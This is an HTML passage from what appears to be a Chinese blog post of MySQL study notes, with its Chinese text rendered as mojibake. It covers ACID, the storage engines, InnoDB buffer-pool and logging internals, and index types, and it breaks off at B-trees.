Constraints</a></p><p><strong>ACID</strong></p><ul><li><p>åŸå­æ€§ï¼ˆAtomicityï¼‰</p><p>ä¸€ä¸ªäº‹åŠ¡è¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å›æ»šå¤±è´¥ï¼Œä¸èƒ½åªæ‰§è¡Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œ</p></li><li><p>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</p><p>äº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ç ´åæ•°æ®åº“çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ï¼Œåœ¨ä¸€ä¸ªäº‹åŠ¡åœ¨æ‰§è¡Œå‰åï¼Œæ•°æ®åº“éƒ½å¿…é¡»å¤„äºä¸€è‡´æ€§çŠ¶æ€ï¼Œä»¥é˜²æ­¢æ•°æ®å´©æºƒ</p></li><li><p>éš”ç¦»æ€§ï¼ˆIsolationï¼‰</p><p>åœ¨å¹¶å‘çš„ç¯å¢ƒä¸­ï¼Œå¹¶å‘äº‹åŠ¡æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡ç›´æ¥ä¸èƒ½äº’ç›¸å¹²æ‰°</p></li><li><p>æŒä¹…æ€§ï¼ˆDurabilityï¼‰</p><p>ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œåˆ™å¯¹åº”æ•°æ®åº“ä¸­çš„æ•°æ®çŠ¶æ€çš„å˜æ›´å°±ä¼šæ°¸ä¹…çš„ä¿å­˜åˆ°æ•°æ®åº“ä¸­</p></li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœéœ€è¦äº‹åŠ¡æ”¯æŒï¼Œå¹¶ä¸”æœ‰è¾ƒé«˜çš„å¹¶å‘è¯»å–é¢‘ç‡ï¼ŒInnoDBé¦–é€‰</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p>æ‰€æœ‰æ•°æ®å€¼é¦–å…ˆå­˜å‚¨åœ¨ä½å­—èŠ‚ä¸­ï¼ˆThe Low Byte Firstï¼‰ï¼Œè¿™ä½¿å¾—MyISAMç‹¬ç«‹äºæ“ä½œç³»ç»Ÿï¼Œå¯ä»¥è½»æ¾åœ°å°†å…¶ä»WindowsæœåŠ¡å™¨ç§»æ¤åˆ°LinuxæœåŠ¡å™¨</p><p>æ¯ä¸ª<code>MyISAM</code>è¡¨éƒ½ä»¥ä¸‰ä¸ªæ–‡ä»¶å­˜å‚¨åœ¨ç£ç›˜ä¸Šã€‚è¿™äº›æ–‡ä»¶å…·æœ‰ä»¥è¡¨åå¼€å¤´çš„åç§°ï¼Œå¹¶å…·æœ‰ç”¨äºæŒ‡ç¤ºæ–‡ä»¶ç±»å‹çš„æ‰©å±•åï¼Œ<code>.frm</code> æ–‡ä»¶å­˜å‚¨è¡¨æ ¼å¼ï¼Œ<code>.MYD</code>ï¼ˆMYDataï¼‰æ–‡ä»¶å­˜å‚¨æ•°æ®ï¼Œ<code>.MYI</code>ï¼ˆMYIndexï¼‰å­˜å‚¨ç´¢å¼•</p><p>æ”¯æŒå¹¶å‘æ’å…¥ï¼Œå³é€‚åˆåœ¨æ’å…¥å¯†é›†å‹è¡¨ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚ç®¡ç†é‚®ä»¶æˆ–WebæœåŠ¡å™¨æ—¥å¿—æ•°æ®</p><p>MyISAMå­˜å‚¨å¼•æ“åœ¨ç­›é€‰å¤§é‡æ•°æ®æ—¶éå¸¸è¿…é€Ÿï¼Œé€‚åˆæ’å…¥å¯†é›†å‹è¡¨</p><h4 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h4><p>å°†æ‰€æœ‰æ•°æ®å­˜å‚¨åœ¨RAMä¸­ï¼Œä»¥ä¾¿åœ¨éœ€è¦å¿«é€ŸæŸ¥æ‰¾éå…³é”®æ•°æ®çš„ç¯å¢ƒä¸­è¿›è¡Œå¿«é€Ÿè®¿é—®ï¼Œå½“mysqldå®ˆæŠ¤è¿›ç¨‹å´©æºƒæ—¶ï¼Œæ‰€æœ‰çš„Memoryæ•°æ®éƒ½ä¼šä¸¢å¤±ã€‚</p><p>è¦æ±‚å­˜å‚¨åœ¨Memoryæ•°æ®è¡¨é‡Œçš„æ•°æ®ä½¿ç”¨çš„æ˜¯é•¿åº¦ä¸å˜çš„æ ¼å¼ï¼Œä¸æ”¯æŒå¯å˜é•¿åº¦æ•°æ®ç±»å‹ï¼ˆåŒ…æ‹¬BLOBå’ŒTEXTï¼‰ï¼ŒVARCHARæ˜¯ä¸€ç§é•¿åº¦å¯å˜çš„ç±»å‹ï¼Œä½†å› ä¸ºå®ƒåœ¨MySQLå†…éƒ¨å½“åšé•¿åº¦å›ºå®šä¸å˜çš„CHARç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ã€‚</p><p>ä¸€èˆ¬åœ¨ç›®æ ‡æ•°æ®è¾ƒå°ï¼Œè€Œä¸”è®¿é—®éå¸¸é¢‘ç¹é€‚åˆä½¿ç”¨ï¼Œé€ æˆå†…å­˜çš„ä½¿ç”¨å¯ä»¥é€šè¿‡å‚æ•°<code>max_help_table_size</code>æ§åˆ¶<code>Memory</code>è¡¨çš„å¤§å°ï¼Œå¦‚æœæ•°æ®æ˜¯ä¸´æ—¶çš„ï¼Œè€Œä¸”è¦æ±‚å¿…é¡»è¢«ç«‹å³ä½¿ç”¨ï¼Œå°±å¯ä»¥å­˜æ”¾åœ¨å†…å­˜è¡¨ä¹‹ä¸­ï¼Œè‹¥æ•°æ®ä¸¢å¤±ï¼Œä¸ä¼šå¯¹åº”ç”¨æœåŠ¡äº§ç”Ÿå®è´¨çš„è´Ÿé¢å½±å“ï¼ŒMemoryåŒæ—¶æ”¯æŒæ•£åˆ—ç´¢å¼•å’ŒBæ•°ç´¢å¼•ã€‚</p><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><p>å®é™…ä¸Šæ˜¯å¸¦æœ‰é€—å·åˆ†éš”ç¬¦çš„æ–‡æœ¬æ–‡ä»¶ï¼ŒCVSè¡¨å…è®¸ä»¥CSVæ ¼å¼å¯¼å…¥æˆ–è½¬å‚¨æ•°æ®ï¼Œä»¥ä¾¿ä¸è¯»å–å’Œå†™å…¥ç›¸åŒæ ¼å¼çš„è„šæœ¬å’Œåº”ç”¨ç¨‹åºäº¤æ¢æ•°æ®ã€‚</p><p>CSV å­˜å‚¨å¼•æ“å› ä¸ºè‡ªèº«æ–‡ä»¶æ ¼å¼çš„åŸå› ï¼Œæ‰€æœ‰åˆ—å¿…é¡»å¼ºåˆ¶æŒ‡å®š NOT NULL ã€‚</p><p>CSV å­˜å‚¨å¼•æ“ä¹Ÿä¼šåŒ…å«ä¸€ä¸ªå­˜å‚¨è¡¨ç»“æ„çš„ .frm æ–‡ä»¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ª .csv å­˜å‚¨æ•°æ®çš„æ–‡ä»¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªåŒåçš„å…ƒä¿¡æ¯æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„æ‰©å±•åä¸º .CSM ï¼Œç”¨æ¥ä¿å­˜è¡¨çš„çŠ¶æ€åŠè¡¨ä¸­ä¿å­˜çš„æ•°æ®é‡ã€‚æ¯ä¸ªæ•°æ®è¡Œå ç”¨ä¸€ä¸ªæ–‡æœ¬è¡Œã€‚</p><h4 id="ARCHIVE"><a href="#ARCHIVE" class="headerlink" title="ARCHIVE"></a>ARCHIVE</h4><p>å½’æ¡£ï¼Œä»…æ”¯æŒæœ€åŸºæœ¬çš„æ’å…¥å’ŒæŸ¥è¯¢ä¸¤ç§åŠŸèƒ½ï¼ŒMySQL 5.5ä»¥åçš„ç‰ˆæœ¬ä¸­å¼€å§‹æ”¯æŒç´¢å¼•ï¼ŒArchiveæ‹¥æœ‰å¾ˆå¥½çš„å‹ç¼©æœºåˆ¶ï¼Œå®ƒä½¿ç”¨zlibå‹ç¼©åº“ï¼Œåœ¨è®°å½•è¢«è¯·æ±‚æ—¶ä¼šå®æ—¶å‹ç¼©ï¼Œæ‰€ä»¥å®ƒç»å¸¸è¢«ç”¨æ¥å½“åšä»“åº“ä½¿ç”¨ã€‚</p><h4 id="BLACKHOLE"><a href="#BLACKHOLE" class="headerlink" title="BLACKHOLE"></a>BLACKHOLE</h4><p>é»‘æ´å­˜å‚¨å¼•æ“ï¼Œæ‰€æœ‰æ’å…¥çš„æ•°æ®å¹¶ä¸ä¼šä¿å­˜ï¼ŒBLACKHOLE å¼•æ“è¡¨æ°¸è¿œä¿æŒä¸ºç©ºï¼Œå†™å…¥çš„ä»»ä½•æ•°æ®éƒ½ä¼šæ¶ˆå¤±ã€‚</p><h3 id="InnoDBåº•å±‚åŸç†"><a href="#InnoDBåº•å±‚åŸç†" class="headerlink" title="InnoDBåº•å±‚åŸç†"></a>InnoDBåº•å±‚åŸç†</h3><p>æ¶æ„å›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409171932233.png" alt loading="lazy"></p><h4 id="Buffer-Pool"><a href="#Buffer-Pool" class="headerlink" title="Buffer Pool"></a>Buffer Pool</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">ç¼“å†²æ± </a></p><p>InnoDBä¸ºäº†åšæ•°æ®çš„æŒä¹…åŒ–ï¼Œä¼šå°†æ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ä½†æ˜¯é¢å¯¹å¤§é‡çš„è¯·æ±‚æ—¶ï¼ŒCPUçš„å¤„ç†é€Ÿåº¦å’Œç£ç›˜çš„IOé€Ÿåº¦ä¹‹é—´å·®è·å¤ªå¤§ï¼Œä¸ºäº†æé«˜æ•´ä½“çš„æ•ˆç‡ï¼Œ InnoDBå¼•å…¥äº†<strong>ç¼“å†²æ± </strong>ã€‚</p><p>ç¼“å†²æ± æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªåŒºåŸŸï¼Œåœ¨InnoDBè®¿é—®è¡¨å’Œç´¢å¼•æ•°æ®çš„æ—¶å€™ä¼šåœ¨å…¶ä¸­è¿›è¡Œé«˜é€Ÿç¼“å­˜ï¼Œç¼“å†²æ± å…è®¸ç›´æ¥ä»å†…å­˜è®¿é—®ç»å¸¸ä½¿ç”¨çš„æ•°æ®ï¼Œä»è€ŒåŠ å¿«äº†å¤„ç†é€Ÿåº¦ã€‚åœ¨ä¸“ç”¨æœåŠ¡å™¨ä¸Šï¼Œé€šå¸¸å°†å¤šè¾¾80ï¼…çš„ç‰©ç†å†…å­˜åˆ†é…ç»™ç¼“å†²æ± ã€‚</p><p>ä¸ºäº†æé«˜å¤§å®¹é‡è¯»å–æ“ä½œçš„æ•ˆç‡ï¼Œç¼“å†²æ± è¢«åˆ’åˆ†ä¸ºå¤šä¸ªé¡µé¢ï¼Œè¿™äº›é¡µé¢å¯ä»¥æ½œåœ¨åœ°å®¹çº³å¤šè¡Œï¼Œä¸ºäº†æé«˜ç¼“å­˜ç®¡ç†çš„æ•ˆç‡ï¼Œä½¿ç”¨æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰ç®—æ³•çš„å˜ä½“ï¼Œå°†å¾ˆå°‘ä½¿ç”¨çš„æ•°æ®ä»ç¼“å­˜ä¸­è€åŒ–æ‰ã€‚</p><p>å¦‚ä½•åˆ©ç”¨ç¼“å†²æ± å°†ç»å¸¸è®¿é—®çš„æ•°æ®ä¿ç•™åœ¨å†…å­˜ä¸­æ˜¯MySQLè°ƒä¼˜çš„é‡è¦æ–¹é¢ã€‚</p><h4 id="Buffer-Pool-LRU-Algorithm"><a href="#Buffer-Pool-LRU-Algorithm" class="headerlink" title="Buffer Pool LRU Algorithm"></a>Buffer Pool LRU Algorithm</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-buffer-pool.html">ç¼“å†²æ± LRUç®—æ³•</a></p><p>ç¼“å†²æ± ä½¿ç”¨LRUç®—æ³•çš„å˜ä½“ä½œä¸ºåˆ—è¡¨è¿›è¡Œç®¡ç†ã€‚å½“éœ€è¦ç©ºé—´ä»¥å°†æ–°é¡µé¢æ·»åŠ åˆ°ç¼“å†²æ± æ—¶ï¼Œå°†é©±é€æœ€è¿‘ä½¿ç”¨æœ€å°‘çš„é¡µé¢ï¼Œå¹¶å°†æ–°é¡µé¢æ·»åŠ åˆ°åˆ—è¡¨çš„ä¸­é—´ã€‚æ­¤ä¸­ç‚¹æ’å…¥ç­–ç•¥å°†åˆ—è¡¨è§†ä¸ºä¸¤ä¸ªå­åˆ—è¡¨ï¼š</p><ul><li><p>æœ€å‰é¢æ˜¯æœ€è¿‘è®¿é—®è¿‡çš„æ–°é¡µé¢ï¼ˆâ€œå¹´è½»â€ï¼‰ çš„å­åˆ—è¡¨</p></li><li><p>åœ¨æœ«å°¾ï¼Œæ˜¯æœ€è¿‘è®¿é—®è¿‡çš„æ—§é¡µé¢çš„å­åˆ—è¡¨</p></li></ul><p>å®˜æ–¹ç»“æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-buffer-pool-list.png" alt loading="lazy"></p><ul><li>3/8çš„ç¼“å­˜æ± ä¸“ç”¨äºæ—§çš„å­åˆ—è¡¨</li><li>åˆ—è¡¨ä¸­ç‚¹æ˜¯æ–°å­åˆ—è¡¨çš„å°¾éƒ¨ä¸æ—§å­åˆ—è¡¨çš„å¤´éƒ¨ç›¸äº¤çš„ç•Œé¢</li><li>å½“InnoDBå°†é¡µé¢è¯»å…¥ç¼“å†²æ± æ—¶ï¼Œé¦–å…ˆæ’å…¥ä¸­ç‚¹</li><li>è®¿é—®æ—§å­åˆ—è¡¨ä¸­çš„é¡µé¢ä¼šä½¿å¾—å…¶å˜ä¸ºâ€å¹´è½»â€œï¼Œç„¶åç§»è‡³æ–°å­åˆ—è¡¨çš„å¼€å¤´</li><li>éšç€æ•°æ®åº“çš„è¿è¡Œï¼Œé€šè¿‡ç§»è‡³åˆ—è¡¨çš„æœ«å°¾ï¼Œç¼“å†²æ± ä¸­æœªè®¿é—®çš„é¡µé¢å°†â€œè€åŒ–â€ï¼Œæ–°çš„å’Œæ—§çš„å­åˆ—è¡¨ä¸­çš„é¡µé¢éƒ½ä¼šéšç€å…¶ä»–é¡µé¢çš„æ›´æ–°è€Œè€åŒ–ï¼Œéšç€åœ¨ä¸­ç‚¹æ’å…¥é¡µé¢ï¼Œæ—§å­åˆ—è¡¨ä¸­çš„é¡µé¢ä¹Ÿä¼šè€åŒ–ã€‚æœ€ç»ˆï¼Œæœªä½¿ç”¨çš„é¡µé¢åˆ°è¾¾æ—§å­åˆ—è¡¨çš„å°¾éƒ¨å¹¶è¢«é€å‡ºã€‚</li></ul><h4 id="Change-Buffer"><a href="#Change-Buffer" class="headerlink" title="Change Buffer"></a>Change Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-change-buffer.html">æ’å…¥ç¼“å†²</a></p><p>æ’å…¥ç¼“å†²é’ˆå¯¹çš„æ“ä½œæ˜¯æ›´æ–°æˆ–è€…æ’å…¥ï¼Œæˆ‘ä»¬è€ƒè™‘æœ€åçš„æƒ…å†µï¼Œé‚£å°±æ˜¯éœ€è¦æ›´æ–°çš„æ•°æ®éƒ½ä¸åœ¨ç¼“å†²æ± ä¸­ã€‚é‚£ä¹ˆæ­¤æ—¶ç­‰æ•°æ®è¾¾åˆ°æŸä¸ªé˜ˆå€¼ï¼ˆä¾‹å¦‚50æ¡ï¼‰æ‰æ‰¹é‡çš„å†™å…¥ç£ç›˜</p><p><img src="https://dev.mysql.com/doc/refman/8.0/en/images/innodb-change-buffer.png" alt loading="lazy"></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffering"><code>innodb_change_buffering</code></a> å˜é‡æ§åˆ¶<code>InnoDB</code> æ‰§è¡Œæ›´æ”¹ç¼“å†²çš„ç¨‹åº¦ï¼Œé»˜è®¤å€¼ä¸ºallã€‚</p><ul><li><p><strong><code>all</code></strong></p><p>é»˜è®¤å€¼ï¼šç¼“å†²åŒºæ’å…¥ï¼Œåˆ é™¤æ ‡è®°æ“ä½œå’Œæ¸…é™¤ã€‚</p></li><li><p><strong><code>none</code></strong></p><p>ä¸è¦ç¼“å†²ä»»ä½•æ“ä½œã€‚</p></li><li><p><strong><code>inserts</code></strong></p><p>ç¼“å†²åŒºæ’å…¥æ“ä½œã€‚</p></li><li><p><strong><code>deletes</code></strong></p><p>ç¼“å†²åŒºåˆ é™¤æ ‡è®°æ“ä½œã€‚</p></li><li><p><strong><code>changes</code></strong></p><p>ç¼“å†²æ’å…¥å’Œåˆ é™¤æ ‡è®°æ“ä½œã€‚</p></li><li><p><strong><code>purges</code></strong></p><p>ç¼“å†²åœ¨åå°å‘ç”Ÿçš„ç‰©ç†åˆ é™¤æ“ä½œã€‚</p></li></ul><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_change_buffer_max_size"><code>innodb_change_buffer_max_size</code></a> å˜é‡å…è®¸å°†æ›´æ”¹ç¼“å†²åŒºçš„æœ€å¤§å¤§å°é…ç½®ä¸ºç¼“å†²æ± æ€»å¤§å°çš„ç™¾åˆ†æ¯”ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>innodb_change_buffer_max_size</code>è®¾ç½®ä¸º25ã€‚æœ€å¤§è®¾ç½®ä¸º50ã€‚</p><h4 id="Log-Buffer"><a href="#Log-Buffer" class="headerlink" title="Log Buffer"></a>Log Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log-buffer.html">æ—¥å¿—ç¼“å†²</a></p><p>æ—¥å¿—ç¼“å†²åŒºæ˜¯å­˜å‚¨åŒºåŸŸï¼Œç”¨äºä¿å­˜è¦å†™å…¥ç£ç›˜ä¸Šçš„æ—¥å¿—æ–‡ä»¶çš„æ•°æ®ã€‚æ—¥å¿—ç¼“å†²åŒºå¤§å°ç”±<a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-parameters.html#sysvar_innodb_log_buffer_size"><code>innodb_log_buffer_size</code></a>å˜é‡å®šä¹‰ ã€‚é»˜è®¤å¤§å°ä¸º16MBã€‚æ—¥å¿—ç¼“å†²åŒºçš„å†…å®¹ä¼šå®šæœŸåˆ·æ–°åˆ°ç£ç›˜ã€‚è¾ƒå¤§çš„æ—¥å¿—ç¼“å†²åŒºä½¿å¤§å‹äº‹åŠ¡å¯ä»¥è¿è¡Œï¼Œè€Œæ— éœ€åœ¨äº‹åŠ¡æäº¤ä¹‹å‰å°†é‡åšæ—¥å¿—æ•°æ®å†™å…¥ç£ç›˜ã€‚å› æ­¤ï¼Œå¦‚æœæœ‰æ›´æ–°ï¼Œæ’å…¥æˆ–åˆ é™¤è®¸å¤šè¡Œçš„äº‹åŠ¡ï¼Œåˆ™å¢åŠ æ—¥å¿—ç¼“å†²åŒºçš„å¤§å°å¯ä»¥èŠ‚çœç£ç›˜I/Oã€‚</p><h4 id="Adaptive-Hash-Index"><a href="#Adaptive-Hash-Index" class="headerlink" title="Adaptive Hash Index"></a>Adaptive Hash Index</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-adaptive-hash.html">è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•</a></p><p>è‡ªé€‚åº”ç´¢å¼•å°±è·ŸJVMåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šåŠ¨æ€çš„æŠŠæŸäº›çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆMachine Codeä¸€æ ·ï¼ŒInnoDBä¼šç›‘æ§å¯¹æ‰€æœ‰ç´¢å¼•çš„æŸ¥è¯¢ï¼Œå¯¹çƒ­ç‚¹è®¿é—®çš„é¡µå»ºç«‹å“ˆå¸Œç´¢å¼•ï¼Œä»¥æ­¤æ¥æå‡è®¿é—®é€Ÿåº¦ã€‚</p><h4 id="Doublewrite-Buffer"><a href="#Doublewrite-Buffer" class="headerlink" title="Doublewrite Buffer"></a>Doublewrite Buffer</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-doublewrite-buffer.html">åŒå†™ç¼“å†²åŒº</a></p><p><strong>æ’å…¥ç¼“å†²</strong>æé«˜äº†MySQLçš„æ€§èƒ½ï¼Œè€Œ<strong>ä¸¤æ¬¡å†™</strong>åˆ™åœ¨æ­¤åŸºç¡€ä¸Šæé«˜äº†æ•°æ®çš„å¯é æ€§ã€‚å½“æ•°æ®è¿˜åœ¨ç¼“å†²æ± ä¸­çš„æ—¶å€™ï¼Œå½“æœºå™¨å®•æœºäº†ï¼Œå‘ç”Ÿäº†<strong>å†™å¤±æ•ˆ</strong>ï¼Œæœ‰Redo Logæ¥è¿›è¡Œæ¢å¤ã€‚ä½†æ˜¯å¦‚æœæ˜¯åœ¨ä»ç¼“å†²æ± ä¸­å°†æ•°æ®åˆ·å›ç£ç›˜çš„æ—¶å€™å®•æœºäº†å‘¢ï¼Ÿ</p><p>è¿™ç§æƒ…å†µå«åšéƒ¨åˆ†å†™å¤±æ•ˆï¼Œæ­¤æ—¶é‡åšæ—¥å¿—å°±æ— æ³•è§£å†³é—®é¢˜ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210409163524052.png" alt loading="lazy"></p><p>åœ¨åˆ·è„é¡µæ—¶ï¼Œå¹¶ä¸æ˜¯ç›´æ¥åˆ·å…¥ç£ç›˜ï¼Œè€Œæ˜¯copyåˆ°å†…å­˜ä¸­çš„Doublewrite Bufferä¸­ï¼Œç„¶åå†æ‹·è´è‡³ç£ç›˜å…±äº«è¡¨ç©ºé—´ï¼ˆä½ å¯ä»¥å°±ç†è§£ä¸ºç£ç›˜ï¼‰ä¸­ï¼Œæ¯æ¬¡å†™å…¥1Mï¼Œç­‰copyå®Œæˆåï¼Œå†å°†Doublewrite Bufferä¸­çš„é¡µå†™å…¥ç£ç›˜æ–‡ä»¶ã€‚</p><p>æœ‰äº†ä¸¤æ¬¡å†™æœºåˆ¶ï¼Œå³ä½¿åœ¨åˆ·è„é¡µæ—¶å®•æœºäº†ï¼Œåœ¨å®ä¾‹æ¢å¤çš„æ—¶å€™ä¹Ÿå¯ä»¥ä»å…±äº«è¡¨ç©ºé—´ä¸­æ‰¾åˆ°Doublewrite Bufferçš„é¡µå‰¯æœ¬ï¼Œç›´æ¥å°†å…¶è¦†ç›–åŸæ¥çš„æ•°æ®é¡µå³å¯ã€‚</p><p>å°½ç®¡æ•°æ®è¢«å†™å…¥ä¸¤æ¬¡ï¼Œä½†åŒå†™ç¼“å†²åŒºä¸éœ€è¦ä¸¤å€çš„I / Oå¼€é”€æˆ–ä¸¤å€çš„I / Oæ“ä½œã€‚åªéœ€ä¸€æ¬¡<code>fsync()</code>è°ƒç”¨æ“ä½œç³»ç»Ÿå³å¯å°†æ•°æ®æŒ‰è¾ƒå¤§çš„é¡ºåºå—å†™å…¥doublewriteç¼“å†²åŒºï¼ˆé™¤é <code>innodb_flush_method</code>è®¾ç½®ä¸º <code>O_DIRECT_NO_FSYNC</code>ï¼‰ã€‚</p><p>åœ¨MySQL 8.0.20ä¹‹å‰ï¼Œdoublewriteç¼“å†²åŒºå­˜å‚¨åŒºä½äº<code>InnoDB</code>ç³»ç»Ÿè¡¨ç©ºé—´ä¸­ã€‚ä»MySQL 8.0.20å¼€å§‹ï¼Œdoublewriteç¼“å†²åŒºå­˜å‚¨åŒºä½äºdoublewriteæ–‡ä»¶ä¸­ã€‚</p><h4 id="Redo-Log"><a href="#Redo-Log" class="headerlink" title="Redo Log"></a>Redo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-redo-log.html">é‡åšæ—¥å¿—</a></p><p>ç”¨äºè®°å½•äº‹åŠ¡æ“ä½œçš„å˜åŒ–ï¼Œä¸”è®°å½•çš„æ˜¯ä¿®æ”¹ä¹‹åçš„å€¼ã€‚</p><p>ä¸ç®¡äº‹åŠ¡æ˜¯å¦æäº¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚ä¾‹å¦‚åœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œä¼šå…ˆå°†æ›´æ–°çš„è®°å½•å†™åˆ°Redo Logä¸­ï¼Œå†æ›´æ–°ç¼“å­˜ä¸­é¡µä¸­çš„æ•°æ®ã€‚ç„¶åæŒ‰ç…§è®¾ç½®çš„æ›´æ–°ç­–ç•¥ï¼Œå°†å†…å­˜ä¸­çš„æ•°æ®åˆ·å›ç£ç›˜ã€‚</p><h4 id="Undo-Log"><a href="#Undo-Log" class="headerlink" title="Undo Log"></a>Undo Log</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-undo-logs.html">æ’¤æ¶ˆæ—¥å¿—</a></p><p>è®°å½•äº‹åŠ¡å¼€å§‹ä¹‹å‰çš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¯ç”¨äºäº‹åŠ¡å¤±è´¥ä¹‹åå‘ç”Ÿçš„å›æ»šã€‚</p><h3 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h3><p>MySQLç´¢å¼•çš„å»ºç«‹å¯¹äºMySQLçš„é«˜æ•ˆè¿è¡Œæ˜¯å¾ˆé‡è¦çš„ï¼Œç´¢å¼•å¯ä»¥å¤§å¤§æé«˜MySQLçš„æ£€ç´¢é€Ÿåº¦ã€‚</p><p>æ‹¿æ±‰è¯­å­—å…¸çš„ç›®å½•é¡µï¼ˆç´¢å¼•ï¼‰æ‰“æ¯”æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰æ‹¼éŸ³ã€ç¬”ç”»ã€åæ—éƒ¨é¦–ç­‰æ’åºçš„ç›®å½•ï¼ˆç´¢å¼•ï¼‰å¿«é€ŸæŸ¥æ‰¾åˆ°éœ€è¦çš„å­—ã€‚</p><p>åˆ›å»ºç´¢å¼•æ—¶ï¼Œä½ éœ€è¦ç¡®ä¿è¯¥ç´¢å¼•æ˜¯åº”ç”¨åœ¨ SQL æŸ¥è¯¢è¯­å¥çš„æ¡ä»¶(ä¸€èˆ¬ä½œä¸º WHERE å­å¥çš„æ¡ä»¶)ã€‚</p><p>å®é™…ä¸Šï¼Œç´¢å¼•ä¹Ÿæ˜¯ä¸€å¼ è¡¨ï¼Œè¯¥è¡¨ä¿å­˜äº†ä¸»é”®ä¸ç´¢å¼•å­—æ®µï¼Œå¹¶æŒ‡å‘å®ä½“è¡¨çš„è®°å½•ã€‚</p><p>è¿‡å¤šçš„ä½¿ç”¨ç´¢å¼•å°†ä¼šé€ æˆæ»¥ç”¨ã€‚å› æ­¤ç´¢å¼•ä¹Ÿä¼šæœ‰å®ƒçš„ç¼ºç‚¹ï¼šè™½ç„¶ç´¢å¼•å¤§å¤§æé«˜äº†æŸ¥è¯¢é€Ÿåº¦ï¼ŒåŒæ—¶å´ä¼šé™ä½æ›´æ–°è¡¨çš„é€Ÿåº¦ï¼Œå¦‚å¯¹è¡¨è¿›è¡ŒINSERTã€UPDATEå’ŒDELETEã€‚å› ä¸ºæ›´æ–°è¡¨æ—¶ï¼ŒMySQLä¸ä»…è¦ä¿å­˜æ•°æ®ï¼Œè¿˜è¦ä¿å­˜ä¸€ä¸‹ç´¢å¼•æ–‡ä»¶ã€‚å»ºç«‹ç´¢å¼•ä¼šå ç”¨ç£ç›˜ç©ºé—´çš„ç´¢å¼•æ–‡ä»¶ã€‚</p><p>ç´¢å¼•åˆ†ä¸ºï¼š</p><ol><li><p>ä¸»é”®ç´¢å¼•</p><p>primary key() è¦æ±‚å…³é”®å­—ä¸èƒ½é‡å¤ï¼Œä¹Ÿä¸èƒ½ä¸ºnull,åŒæ—¶å¢åŠ ä¸»é”®çº¦æŸ</p><p>ä¸»é”®ç´¢å¼•å®šä¹‰æ—¶ï¼Œä¸èƒ½å‘½å</p></li><li><p>å”¯ä¸€ç´¢å¼•</p><p>unique index() è¦æ±‚å…³é”®å­—ä¸èƒ½é‡å¤ï¼ŒåŒæ—¶å¢åŠ å”¯ä¸€çº¦æŸ</p></li><li><p>æ™®é€šç´¢å¼•</p><p>index() å¯¹å…³é”®å­—æ²¡æœ‰è¦æ±‚</p></li><li><p>å…¨æ–‡ç´¢å¼•</p><p>fulltext key() å…³é”®å­—çš„æ¥æºä¸æ˜¯æ‰€æœ‰å­—æ®µçš„æ•°æ®ï¼Œè€Œæ˜¯å­—æ®µä¸­æå–çš„ç‰¹åˆ«å…³é”®å­—</p></li></ol><p>å…ˆäº†è§£ä¸€ä¸‹ç´¢å¼•çš„æ•°æ®ç»“æ„ B-Treeï¼ˆMySQLä¸»è¦ä½¿ç”¨ B-tree å¹³è¡¡æ ‘ï¼‰</p><h4 id="Bæ ‘"><a href="#Bæ ‘" class="headerlink" title="Bæ ‘"></a>Bæ ‘</h4><p>Bæ ‘ä¹Ÿç§°B-æ ‘,å®ƒæ˜¯ä¸€é¢—å¤šè·¯å¹³è¡¡æŸ¥æ‰¾æ ‘ã€‚å¤§è‡´ç»“æ„å¦‚ä¸‹</p><p><img 